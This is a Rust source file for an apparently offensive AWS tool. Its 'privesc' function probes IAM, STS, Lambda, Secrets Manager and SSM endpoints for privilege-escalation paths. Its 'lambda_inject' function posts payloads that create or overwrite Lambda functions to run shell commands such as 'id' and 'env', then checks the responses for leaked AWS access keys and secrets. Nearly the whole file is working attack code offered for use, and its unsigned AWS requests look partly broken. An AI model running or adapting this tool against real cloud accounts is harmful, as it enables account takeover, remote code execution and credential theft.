use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const PRIVESC_PATHS: &[(&str, &str, &str)] = &[
    (
        "sts:GetCallerIdentity",
        "GET",
        "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15",
    ),
    (
        "iam:ListUsers",
        "GET",
        "https://iam.amazonaws.com/?Action=ListUsers&Version=2010-05-08",
    ),
    (
        "iam:ListRoles",
        "GET",
        "https://iam.amazonaws.com/?Action=ListRoles&Version=2010-05-08",
    ),
    (
        "iam:GetRole",
        "GET",
        "https://iam.amazonaws.com/?Action=GetRole&RoleName=target&Version=2010-05-08",
    ),
    (
        "iam:ListAttachedRolePolicies",
        "GET",
        "https://iam.amazonaws.com/?Action=ListAttachedRolePolicies&RoleName=target&Version=2010-05-08",
    ),
    (
        "iam:ListPolicies",
        "GET",
        "https://iam.amazonaws.com/?Action=ListPolicies&Version=2010-05-08",
    ),
    (
        "iam:GetPolicy",
        "GET",
        "https://iam.amazonaws.com/?Action=GetPolicy&PolicyArn=arn:aws:iam::aws:policy/AdministratorAccess&Version=2010-05-08",
    ),
    ("iam:CreateAccessKey", "POST", "https://iam.amazonaws.com/"),
    (
        "iam:UpdateAssumeRolePolicy",
        "POST",
        "https://iam.amazonaws.com/",
    ),
    ("iam:PassRole", "POST", "https://iam.amazonaws.com/"),
    (
        "lambda:CreateFunction",
        "POST",
        "https://lambda.us-east-1.amazonaws.com/2015-03-31/functions",
    ),
    (
        "lambda:InvokeFunction",
        "POST",
        "https://lambda.us-east-1.amazonaws.com/2015-03-31/functions/target/invocations",
    ),
    ("sts:AssumeRole", "POST", "https://sts.amazonaws.com/"),
    ("s3:ListAllMyBuckets", "GET", "https://s3.amazonaws.com/"),
    (
        "ec2:DescribeInstances",
        "GET",
        "https://ec2.us-east-1.amazonaws.com/?Action=DescribeInstances&Version=2016-11-15",
    ),
    (
        "ssm:GetParameters",
        "POST",
        "https://ssm.us-east-1.amazonaws.com/",
    ),
    (
        "secretsmanager:GetSecretValue",
        "POST",
        "https://secretsmanager.us-east-1.amazonaws.com/",
    ),
    (
        "kms:ListKeys",
        "GET",
        "https://kms.us-east-1.amazonaws.com/",
    ),
];

const LAMBDA_PAYLOADS: &[&str] = &[
    r#"{"Action":"CreateFunction","FunctionName":"privesc","Runtime":"python3.12","Role":"arn:aws:iam::123:role/lambda-role","Handler":"index.handler","Code":{"ZipFile":"def handler(event,context):\n import os\n os.system('id')"}"#,
    r#"{"Action":"InvokeFunction","FunctionName":"target","Payload":"{\"cmd\":\"env\"}"}"#,
    r#"{"Action":"UpdateFunctionCode","FunctionName":"target","ZipFile":"malicious_code"}"#,
];

pub async fn privesc(token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} AWS IAM Privilege Escalation Tester",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!(
        "{} Testing {} escalation paths",
        "[*]".cyan().bold(),
        PRIVESC_PATHS.len()
    );
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let mut accessible = Vec::new();
    let mut denied = Vec::new();

    for (perm, method, url) in PRIVESC_PATHS {
        let req = if *method == "GET" {
            client.get(*url)
        } else {
            client
                .post(*url)
                .header("Content-Type", "application/x-amz-json-1.1")
        };
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let allowed = status == 200;
                let tag = if allowed {
                    "ALLOWED".red().bold().to_string()
                } else if status == 403 {
                    "denied".yellow().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:40} status={} {}", "*".cyan(), perm, status, tag);
                if allowed {
                    accessible.push((*perm, body.chars().take(200).collect::<String>()));
                } else if status == 403 {
                    denied.push(*perm);
                }
            }
            Err(_) => {
                println!("  {} {:40} error", "*".red(), perm);
            }
        }
    }

    println!("{}", "-".repeat(60).dimmed());
    println!(
        "{} {} / {} permissions allowed, {} denied",
        "[*]".cyan().bold(),
        accessible.len(),
        PRIVESC_PATHS.len(),
        denied.len()
    );

    if !accessible.is_empty() {
        println!("\n{} Accessible permissions:", "[!]".red().bold());
        for (perm, body) in &accessible {
            println!(
                "  {} {} — {}",
                "*".red(),
                perm,
                body.chars().take(80).collect::<String>()
            );
        }

        if accessible.iter().any(|(p, _)| *p == "iam:CreateAccessKey") {
            println!(
                "\n{} [CRITICAL] Can create access keys — full account compromise!",
                "[!]".red().bold()
            );
        }
        if accessible.iter().any(|(p, _)| *p == "sts:AssumeRole") {
            println!(
                "{} [CRITICAL] Can assume roles — lateral movement possible!",
                "[!]".red().bold()
            );
        }
        if accessible.iter().any(|(p, _)| *p == "iam:PassRole") {
            println!(
                "{} [CRITICAL] Can pass roles to services — privesc via service!",
                "[!]".red().bold()
            );
        }
        if accessible
            .iter()
            .any(|(p, _)| *p == "lambda:CreateFunction")
        {
            println!(
                "{} [HIGH] Can create Lambda functions — RCE via Lambda!",
                "[!]".red().bold()
            );
        }
        if accessible
            .iter()
            .any(|(p, _)| *p == "secretsmanager:GetSecretValue")
        {
            println!(
                "{} [HIGH] Can read secrets — credential extraction!",
                "[!]".red().bold()
            );
        }
        if accessible.iter().any(|(p, _)| *p == "ssm:GetParameters") {
            println!(
                "{} [HIGH] Can read SSM parameters — may contain secrets!",
                "[!]".red().bold()
            );
        }
    }

    if !denied.is_empty() {
        println!(
            "\n{} Denied permissions ({} total) — check for missing privileges:",
            "[*]".cyan().bold(),
            denied.len()
        );
    }

    Ok(())
}

pub async fn lambda_inject(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} AWS Lambda Code Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} {} payloads", "[*]".cyan().bold(), LAMBDA_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let mut results = Vec::new();

    for (i, payload) in LAMBDA_PAYLOADS.iter().enumerate() {
        let mut req = client.post(url).header("Content-Type", "application/json");
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let exploited = text.contains("uid=")
                    || text.contains("root")
                    || text.contains("AWS_REGION")
                    || text.contains("AWS_ACCESS_KEY")
                    || text.contains("AWS_SECRET")
                    || text.contains("ami-")
                    || text.contains("FunctionArn");
                let tag = if exploited {
                    "EXPLOITED".red().bold().to_string()
                } else if status == 200 || status == 201 {
                    "executed".yellow().to_string()
                } else {
                    "blocked".green().to_string()
                };
                println!("  {} [{:02}] status={} {}", "*".cyan(), i + 1, status, tag);
                if exploited {
                    println!(
                        "    {} {}",
                        ">".red().bold(),
                        text.chars().take(300).collect::<String>()
                    );
                    results.push(true);
                }
            }
            Err(_) => {
                println!("  {} [{:02}] error", "*".red(), i + 1);
            }
        }
    }

    println!(
        "\n{} {} / {} Lambda injections succeeded",
        "[*]".cyan().bold(),
        results.len(),
        LAMBDA_PAYLOADS.len()
    );
    Ok(())
}
